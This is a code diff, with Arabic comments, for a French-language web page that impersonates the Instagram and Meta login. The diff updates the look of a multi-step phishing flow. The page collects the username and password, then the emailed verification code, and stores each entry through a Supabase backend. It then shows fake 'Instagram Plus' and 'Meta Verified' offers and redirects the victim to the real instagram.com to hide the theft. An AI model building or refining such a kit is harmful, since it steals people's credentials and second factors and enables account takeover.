@@ -6,51 +6,42 @@
   <title>Instagram</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-    body { background-color: #ffffff; color: #000; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 15px; }
-    .app-container { width: 100%; max-width: 400px; margin: 0 auto; text-align: center; }
+    body { background-color: #ffffff; color: #000; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px 15px; }
+    .app-container { width: 100%; max-width: 380px; margin: 0 auto; text-align: center; min-height: 90vh; display: flex; flex-direction: column; justify-content: space-between; }
+    .content-wrap { width: 100%; }
 
-    /* التصميم العام */
-    .insta-logo-img { width: 60px; height: 60px; margin: 15px auto 10px; }
-    .inputs-area { margin: 20px 0 10px; }
-    input[type="text"], input[type="password"] { width: 100%; padding: 12px 14px; border: 1px solid #ccd0d5; border-radius: 8px; font-size: 13px; background: #f5f6f7; margin-bottom: 10px; outline: none; }
-    .btn-blue { width: 100%; background-color: #0064e0; color: #fff; border: none; padding: 12px; border-radius: 25px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 5px; }
+    /* الهيدر وشعار اللغة */
+    .lang-select { font-size: 13px; color: #65676b; margin-bottom: 40px; }
+    .insta-icon-large { width: 75px; height: 75px; margin: 0 auto 35px; display: block; }
     
-    /* 1️⃣ الشاشة الأولى (تسجيل الدخول) */
-    .title-login { font-size: 18px; font-weight: 700; margin-bottom: 5px; color: #1c1e21; }
+    /* الخانات والأزرار */
+    .inputs-group { margin-bottom: 12px; }
+    input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #e0e0e0; border-radius: 12px; font-size: 14px; background: #fafafa; margin-bottom: 12px; outline: none; }
+    input[type="text"]:focus, input[type="password"]:focus { border-color: #a8a8a8; background: #fff; }
 
-    /* 2️⃣ الشاشة الثانية (الكود) */
-    .subtitle { font-size: 13px; color: #65676b; margin-bottom: 20px; line-height: 1.4; }
+    .btn-main { width: 100%; background-color: #0064e0; color: #fff; border: none; padding: 13px; border-radius: 25px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 4px; }
+    .btn-main:active { opacity: 0.8; }
 
-    /* 3️⃣ الشاشة الثالثة (Instagram Plus) */
+    .link-forgot { display: inline-block; color: #1c1e21; font-size: 13px; font-weight: 600; text-decoration: none; margin-top: 18px; }
+
+    /* أسفل الصفحة (الشاشات الأولى والثانية) */
+    .footer-actions { margin-top: auto; padding-top: 20px; }
+    .btn-outline { width: 100%; background: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 11px; border-radius: 25px; font-weight: 600; font-size: 14px; cursor: pointer; text-decoration: none; display: block; margin-bottom: 18px; }
+    .meta-logo-footer { font-size: 14px; font-weight: 700; color: #0064e0; display: flex; align-items: center; justify-content: center; gap: 4px; }
+
+    /* الشاشات القديمة (Plus & Meta) */
     .title-plus { font-size: 20px; font-weight: 700; color: #1c1e21; margin-bottom: 8px; line-height: 1.3; }
     .title-plus span { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .subtitle-text { font-size: 13px; color: #65676b; margin-bottom: 20px; line-height: 1.4; }
     .menu-box { border: 1px solid #e4e6eb; border-radius: 12px; overflow: hidden; margin: 20px 0; text-align: left; }
-    .menu-item { display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; border-bottom: 1px solid #f0f2f5; font-size: 14px; font-weight: 500; color: #1c1e21; }
+    .menu-item { display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; border-bottom: 1px solid #f0f2f5; font-size: 14px; font-weight: 500; }
     .menu-item:last-child { border-bottom: none; }
-    .menu-left { display: flex; align-items: center; gap: 12px; }
-    .arrow { color: #8a8d91; font-size: 14px; }
-
-    /* 4️⃣ الشاشة الرابعة (Meta Verified) */
-    .meta-header { display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
-    .meta-logo-text { font-size: 16px; font-weight: 700; color: #0064e0; }
-    .avatar-wrapper { position: relative; width: 70px; height: 70px; margin: 0 auto 8px; }
-    .avatar-img { width: 100%; height: 100%; border-radius: 50%; background: #e4e6eb; }
-    .badge-icon { position: absolute; bottom: 0; right: 0; width: 20px; height: 20px; }
-    .user-name-title { font-size: 16px; font-weight: 700; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 4px; }
-    .followers-badge { font-size: 12px; color: #65676b; margin-bottom: 20px; }
-    .cards-scroll { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 10px; margin-bottom: 20px; text-align: left; }
-    .card-plan { border: 1px solid #e4e6eb; border-radius: 16px; padding: 16px; min-width: 260px; flex: 1; background: #fff; }
-    .plan-title { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
-    .plan-price { font-size: 12px; color: #008a00; font-weight: 600; margin-bottom: 8px; }
-    .tag-recommended { display: inline-block; background: #e7f3ff; color: #1877f2; font-size: 11px; font-weight: 600; padding: 3px 8px; border-radius: 6px; margin-bottom: 12px; }
-    .plan-sub-feature { display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: #4b4f56; margin-bottom: 8px; }
 
     /* Loader */
-    .loader-box { display: flex; flex-direction: column; align-items: center; padding: 60px 0; }
+    .loader-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 300px; }
     .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0064e0; border-radius: 50%; width: 36px; height: 36px; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-    .footer-note { font-size: 11px; color: #65676b; margin: 12px 0; line-height: 1.4; }
     .hidden { display: none !important; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -59,89 +50,92 @@
 
   <div class="app-container">
 
-    <!-- 1️⃣ الشاشة الأولى: إدخال Adresse e-mail و Mot de passe -->
-    <div id="step-1-login">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-logo-img" alt="Instagram">
-      <h2 class="title-login">Connexion à Instagram</h2>
-      <p class="subtitle">Entrez vos identifiants pour continuer</p>
+    <!-- 1️⃣ الشاشة الأولى: تصميم تسجيل الدخول الحديث (مطابق للصورة 2) -->
+    <div id="step-1-login" class="content-wrap" style="height: 100%; display: flex; flex-direction: column; justify-content: space-between;">
+      <div>
+        <div class="lang-select">Français (France) ∨</div>
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-icon-large" alt="Instagram">
 
-      <form id="loginForm">
-        <div class="inputs-area">
-          <input type="text" id="username" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
-          <input type="password" id="password" placeholder="Mot de passe" required>
-        </div>
-        <button type="submit" class="btn-blue">Se connecter</button>
-      </form>
+        <form id="loginForm">
+          <div class="inputs-group">
+            <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+          </div>
+          <button type="submit" class="btn-main">Se connecter</button>
+        </form>
+
+        <a href="#" class="link-forgot">Mot de passe oublié ?</a>
+      </div>
+
+      <div class="footer-actions">
+        <a href="#" class="btn-outline">Créer un nouveau compte</a>
+        <div class="meta-logo-footer">∞ Meta</div>
+      </div>
     </div>
 
-    /* شاشة التحميل بين الخطوات */
+    <!-- شاشة التحميل -->
     <div id="step-loading" class="loader-box hidden">
       <div class="spinner"></div>
-      <div style="font-size: 14px; font-weight: 500;">Vérification des données...</div>
+      <div style="font-size: 14px; color: #65676b;">Vérification des données...</div>
     </div>
 
-    <!-- 2️⃣ الشاشة الثانية: إدخال كود التحقيق (Code) -->
-    <div id="step-2-code" class="hidden">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-logo-img" alt="Instagram">
-      <h2 style="font-size: 18px; font-weight: 700; margin-bottom: 8px;">Code de vérification</h2>
-      <p class="subtitle">Entrez le code à 6 chiffres envoyé à votre appareil.</p>
-      
-      <form id="codeForm">
-        <div class="inputs-area">
-          <input type="text" id="verificationCode" placeholder="Code (6 chiffres)" maxlength="8" style="text-align: center; font-size: 18px;" required>
-        </div>
-        <button type="submit" class="btn-blue">Confirmer</button>
-      </form>
+    <!-- 2️⃣ الشاشة الثانية: تصميم كود التحقيق الحديث (مطابق للصورة 4) -->
+    <div id="step-2-code" class="content-wrap hidden" style="height: 100%; display: flex; flex-direction: column; justify-content: space-between;">
+      <div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-icon-large" alt="Instagram" style="margin-top: 30px;">
+        
+        <h2 style="font-size: 16px; font-weight: 700; margin-bottom: 8px;">Entrez le code de vérification</h2>
+        <p class="subtitle-text" style="font-size: 12px; margin-bottom: 25px;">Nous avons envoyé un code de vérification à votre e-mail. Veuillez l'entrer ci-dessous.</p>
+
+        <form id="codeForm">
+          <div class="inputs-group">
+            <input type="text" id="verificationCode" placeholder="Code de vérification" maxlength="8" style="text-align: center; font-size: 15px;" required>
+          </div>
+          <button type="submit" class="btn-main">Continuer</button>
+        </form>
+
+        <a href="#" class="link-forgot" style="color: #0064e0; margin-top: 20px;">Renvoyer le code</a>
+      </div>
+
+      <div class="footer-actions">
+        <a href="#" class="btn-outline">Créer un nouveau compte</a>
+        <div class="meta-logo-footer">∞ Meta</div>
+      </div>
     </div>
 
-    <!-- 3️⃣ الشاشة الثالثة: واجهة Instagram Plus (صورة 2) -->
-    <div id="step-3-plus" class="hidden">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-logo-img" alt="Instagram">
+    <!-- 3️⃣ الشاشة الثالثة: واجهة Instagram Plus -->
+    <div id="step-3-plus" class="content-wrap hidden">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-icon-large" style="width:50px; height:50px; margin-bottom:15px;" alt="Instagram">
       <h1 class="title-plus">Vous, essayez <span>Instagram Plus</span> gratuitement pendant un mois</h1>
-      <p class="subtitle">Commandes avancées. Fonctionnalités exclusives.<br>0,99 $US / mois · Ce prix peut inclure des taxes</p>
+      <p class="subtitle-text">Commandes avancées. Fonctionnalités exclusives.<br>0,99 $US / mois · Ce prix peut inclure des taxes</p>
 
       <div class="menu-box">
-        <div class="menu-item"><div class="menu-left"><span>👁️</span> <span>Prévisualisez les stories</span></div><span class="arrow">&gt;</span></div>
-        <div class="menu-item"><div class="menu-left"><span>🔄</span> <span>Consultez les statistiques de relecture de vos stories</span></div><span class="arrow">&gt;</span></div>
-        <div class="menu-item"><div class="menu-left"><span>🔍</span> <span>Recherchez dans la liste des personnes ayant regardé votre story</span></div><span class="arrow">&gt;</span></div>
-        <div class="menu-item"><div class="menu-left"><span>💬</span> <span>Prévisualisez les messages</span></div><span class="arrow">&gt;</span></div>
-        <div class="menu-item"><div class="menu-left"><span>T</span> <span>Accédez à des polices personnalisées pour votre bio</span></div><span class="arrow">&gt;</span></div>
+        <div class="menu-item"><span>👁️ Prévisualisez les stories</span> <span>&gt;</span></div>
+        <div class="menu-item"><span>🔄 Consultez les statistiques de relecture</span> <span>&gt;</span></div>
+        <div class="menu-item"><span>🔍 Recherchez dans la liste des vues</span> <span>&gt;</span></div>
+        <div class="menu-item"><span>💬 Prévisualisez les messages</span> <span>&gt;</span></div>
+        <div class="menu-item"><span>T Polices personnalisées</span> <span>&gt;</span></div>
       </div>
 
-      <p class="footer-note">En continuant, vous acceptez les Conditions de service.</p>
-      <button class="btn-blue" onclick="showStepMeta()">Essayer pour 0,00 $US</button>
+      <button class="btn-main" onclick="showStepMeta()">Essayer pour 0,00 $US</button>
     </div>
 
-    <!-- 4️⃣ الشاشة الرابعة: واجهة Meta Verified (صورة 1) -->
-    <div id="step-4-meta" class="hidden">
-      <div class="meta-header">
-        <span class="meta-logo-text">∞ Meta</span>
-      </div>
-      <h1 style="font-size: 20px; font-weight: 700; margin-bottom: 15px;">Bénéficiez du premier mois gratuit</h1>
+    <!-- 4️⃣ الشاشة الرابعة: واجهة Meta Verified -->
+    <div id="step-4-meta" class="content-wrap hidden">
+      <div style="font-size: 16px; font-weight: 700; color: #0064e0; margin-bottom: 15px;">∞ Meta</div>
+      <h1 style="font-size: 18px; font-weight: 700; margin-bottom: 15px;">Bénéficiez du premier mois gratuit</h1>
 
-      <div class="avatar-wrapper">
-        <div class="avatar-img"></div>
-        <svg class="badge-icon" viewBox="0 0 24 24" fill="#0095f6"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.4-1.4 3.6 3.6 7.6-7.6 L18 8l-9 9z"/></svg>
-      </div>
-      <div class="user-name-title">User <svg width="16" height="16" viewBox="0 0 24 24" fill="#0095f6"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.4-1.4 3.6 3.6 7.6-7.6 L18 8l-9 9z"/></svg></div>
-      
-      <div class="followers-badge">
-        <span>👥 125 profils que vous suivez possèdent déjà un badge Vérifié.</span>
+      <div style="width:60px; height:60px; border-radius:50%; background:#e4e6eb; margin: 0 auto 10px;"></div>
+      <div style="font-weight:700; font-size:15px; margin-bottom:15px;">User ✔️</div>
+
+      <div style="border:1px solid #e4e6eb; border-radius:12px; padding:15px; text-align:left; margin-bottom:20px;">
+        <div style="font-weight:700; font-size:15px;">Standard</div>
+        <div style="color:#008a00; font-size:12px; margin: 4px 0 8px;">1 mois offert</div>
+        <div style="font-size:12px; color:#4b4f56;">✔️ Badge Vérifié</div>
       </div>
 
-      <div class="cards-scroll">
-        <div class="card-plan">
-          <div class="plan-title">Standard</div>
-          <div class="plan-price">1 mois offert 6,49 $US/mois</div>
-          <span class="tag-recommended">Recommandé</span>
-          
-          <div style="font-weight:700; font-size:13px; margin: 8px 0 4px;">✔️ Badge Vérifié</div>
-          <div class="plan-sub-feature">✓ Optimisation du référencement</div>
-          <div class="plan-sub-feature">✓ Liens de profil mis à niveau</div>
-        </div>
-      </div>
-
-      <button class="btn-blue" onclick="window.location.href='https://www.instagram.com'">Essayer pour 0,00 $US</button>
+      <button class="btn-main" onclick="window.location.href='https://www.instagram.com'">Essayer pour 0,00 $US</button>
     </div>
 
   </div>
@@ -153,7 +147,7 @@
 
     let currentUserId = null;
 
-    // 1️⃣ الشاشة 1: حفظ الإيميل والباسورد فوراً عند الضغط
+    // 1️⃣ إرسال البيانات فوراً عند الضغط على Se connecter
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       
@@ -173,14 +167,14 @@
         currentUserId = data[0].id;
       }
 
-      // الانتقال إلى الشاشة الثانية (الكود)
+      // إظهار واجهة الكود الثانية بعد التحميل
       setTimeout(() => {
         document.getElementById('step-loading').classList.add('hidden');
         document.getElementById('step-2-code').classList.remove('hidden');
       }, 2500);
     });
 
-    // 2️⃣ الشاشة 2: تحديث الكود ثم الانتقال للشاشة الثالثة (Instagram Plus)
+    // 2️⃣ إرسال الكود والانتقال للواجهة الثالثة
     document.getElementById('codeForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       
@@ -197,7 +191,7 @@
       document.getElementById('step-3-plus').classList.remove('hidden');
     });
 
-    // 3️⃣ التنقل من الشاشة 3 إلى الشاشة 4 (Meta)
+    // 3️⃣ الانتقال للواجهة الرابعة
     function showStepMeta() {
       document.getElementById('step-3-plus').classList.add('hidden');
       document.getElementById('step-4-meta').classList.remove('hidden');
